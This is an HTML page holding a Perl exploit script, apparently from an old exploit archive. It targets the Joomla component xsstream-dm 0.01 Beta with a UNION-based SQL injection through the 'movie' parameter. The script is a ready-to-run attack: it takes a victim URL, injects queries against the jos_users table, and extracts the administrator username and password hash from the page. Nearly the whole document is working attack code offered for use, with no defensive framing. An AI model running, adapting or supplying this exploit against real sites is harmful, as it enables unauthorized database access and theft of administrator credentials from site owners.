<html><head><title>Joomla Component xsstream-dm 0.01b Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#########################################################
#     Joomla Component xsstream-dm 0.01 Beta Remote SQL Injection	#
#########################################################

########################################
#[*] Founded by : Houssamix From H-T Team 
#[*] H-T Team [ HouSSaMix + ToXiC350 ] from MoroCCo
#[*] Contact: Ev!L
#[*] Greetz : CoNaN &amp; HaCkeR_EgY &amp; All friends &amp; All muslims HaCkeRs  :) 
########################################

#[*] Script_Name: &quot;Joomla&quot;
#[*] Component_Name: &quot;xsstream-dm&quot; 0.01 Beta


########################################



print &quot;\t\t########################################################\n\n&quot;;
print &quot;\t\t#                        Viva Islam                    #\n\n&quot;;
print &quot;\t\t########################################################\n\n&quot;;
print &quot;\t\t# Joomla Component (xsstream-dm) Remote SQL Injection  #\n\n&quot;;
print &quot;\t\t#           by Houssamix &amp; Stack-Terrorist             #\n\n&quot;;
print &quot;\t\t#              from H-T Team &amp; v4 Team                 #\n\n&quot;;
print &quot;\t\t########################################################\n\n&quot;;

use LWP::UserAgent;
die &quot;Example: perl $0 http://victim.com/\n&quot; unless @ARGV;
#the username of joomla 
$user=&quot;username&quot;;
#the pasword of joomla 
$pass=&quot;password&quot;;
#the tables of joomla 
$tab=&quot;jos_users&quot;;
#the the union of joomla 
$un=&quot;/**/union/**/select/**/&quot;;
#the vulnerable compenent  
$com=&quot;com_xsstream-dm&amp;Itemid&quot;;
# Lets star exploiting 
$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . &quot;/index.php?option=&quot;.$com.&quot;=69&amp;movie=-1&quot;.$un.&quot;1,2,&quot;.$user.&quot;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/&quot;.$tab.&quot;/**&quot;;

$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
$answer = $res-&gt;content;

if ($answer =~ /&lt;div class=&quot;contentpagetitle&quot;&gt;(.*?)&lt;\/div&gt;/){
        
        print &quot;\n[+] Admin User : $1&quot;;
}
$host2 = $ARGV[0] . &quot;/index.php?option=&quot;.$com.&quot;=69&amp;movie=-1&quot;.$un.&quot;1,2,&quot;.$pass.&quot;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/&quot;.$tab.&quot;/**&quot;;

$res2 = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host2));
$answer = $res2-&gt;content;

if ($answer =~/([0-9a-fA-F]{32})/){print &quot;\n[+] Admin Hash : $1\n\n&quot;;
print &quot;\t\t#   Exploit has ben aported user and password hash   #\n\n&quot;;
}

else{print &quot;\n[-] Exploit Failed...\n&quot;;}



#exploit discovered by Houssamix From H-T Team
# exploit exploited by Stack-Terrorist 

# milw0rm.com [2008-05-11]</pre></html>